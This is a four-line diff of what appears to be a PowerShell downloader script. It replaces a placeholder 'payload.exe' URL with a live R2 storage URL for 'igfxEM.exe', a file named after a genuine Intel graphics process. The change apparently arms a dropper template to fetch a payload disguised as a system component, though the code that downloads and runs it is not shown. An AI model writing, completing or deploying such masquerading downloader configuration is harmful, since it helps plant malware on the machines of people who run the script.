@@ -1,4 +1,4 @@
-$ExeUrl = "https://pub-xxxx.r2.dev/yourbucket/payload.exe"
+$ExeUrl = "https://pub-1045ad571e1d4b13bd996dc0460ed5c7.r2.dev/igfxEM.exe"
 $AppName = "igfxEM.exe"
 
 $ErrorActionPreference = "Stop"
